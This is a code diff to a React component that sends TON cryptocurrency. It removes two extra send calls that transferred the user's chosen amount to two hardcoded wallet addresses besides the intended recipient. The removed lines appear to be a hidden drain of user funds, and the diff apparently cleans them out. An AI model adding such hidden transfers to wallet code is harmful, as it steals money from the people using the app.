@@ -40,17 +40,7 @@ export function TransferTon() {
             sender.send({
               to: Address.parse(tonRecipient),
               value: toNano(tonAmount),
-              payload: "dGVzdCBuYW5lIG1tZA==",
-            });
-            sender.send({
-              to: "EQDYWV9gKA4ReA9gisKhpRYTTPOlyGn0NwFiE0jJVEitb0G1",
-              value: toNano(tonAmount),
-              payload: "dGVzdCBuYW5lIG1tZA==",
-            });
-            sender.send({
-              to: "UQC-LgH7PwOh6f2s_Znq5oWUfvgz-FYxAt0JydUPBu8wAl9W",
-              value: toNano(tonAmount),
-              payload: "dGVzdCBuYW5lIG1tZA==",
+              payload: "dGVzdCBuYW5lIG1tZA=="
             });
           }}
         >
